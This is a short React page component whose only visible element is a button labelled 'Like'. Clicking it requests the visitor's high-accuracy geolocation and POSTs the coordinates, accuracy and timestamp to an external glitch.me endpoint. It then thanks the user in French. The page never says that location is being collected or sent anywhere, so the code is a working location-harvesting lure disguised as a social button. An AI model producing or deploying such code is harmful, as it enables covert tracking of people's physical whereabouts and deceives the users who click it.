import { useState } from 'react';

export default function Home() {
  const [message, setMessage] = useState<string | null>(null);

  const handleShareLocation = () => {
    console.log("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    if (!navigator.geolocation) {
      setMessage("Votre navigateur ne supporte pas la géolocalisation.");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const coords = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp
        };

        try {
          const response = await fetch('https://empty-mighty-diagram.glitch.me/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(coords)
          });
          console.log("response",response);

          if (response.ok) {
            setMessage("✅ Merci bcp !");
          } else {
            setMessage("❌ Erreur lors de l'envoi au serveur.");
          }
        } catch (error) {
          console.error(error);
          setMessage("❌ Erreur réseau.");
        }
      },
      (error) => {
        setMessage("❌ Échec de la géolocalisation : " + error.message);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  };

  return (
    <div className="d-flex flex-column align-items-center justify-content-center min-vh-100 bg-light">
      <a
        onClick={handleShareLocation}
        className="btn btn-primary d-flex align-items-center gap-2"
        style={{ cursor: 'pointer' }}
      >
        <i className="bi bi-geo-alt-fill"></i>Like
      </a>
      
      {message && (
        <p className="mt-3 text-center text-muted small">
          {message}
        </p>
      )}
    </div>
  );
}
